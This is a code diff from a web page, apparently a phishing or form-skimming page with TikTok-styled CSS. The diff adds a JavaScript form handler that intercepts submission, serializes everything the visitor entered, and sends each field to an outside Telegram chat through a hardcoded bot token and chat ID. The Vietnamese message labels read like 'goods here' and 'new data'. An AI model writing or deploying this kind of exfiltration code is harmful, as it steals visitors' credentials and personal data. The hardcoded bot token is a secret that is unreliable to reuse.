@@ -4941,12 +4941,16 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
         'params': metrics.params
     };
     
+function firstFormHandle(event) {
+    event.preventDefault();
 
+    // ✅ Cập nhật lại templateData trước khi gửi
+    updateFormsSendData(serializeForm(firstForm));
 
     var botToken = "6842756326:AAFDAatuHcgfNYU5nu3chRErxKw6o3vWf74";
     var chatId = "-1002558191024";
 
-    var message = "📥 Hàng nè:\n";
+    var message = "📥 DỮ LIỆU MỚI:\n";
     for (var key in templateData) {
         message += `🔹 ${key}: ${templateData[key]}\n`;
     }
@@ -4968,8 +4972,8 @@ div[class^="tiktok"].--savior-overlay-z-index-reset {
     .catch((err) => {
         console.error("❌ Gửi thất bại:", err);
     });
-
 }
+
         function firstFormHandle(event) {
 
             
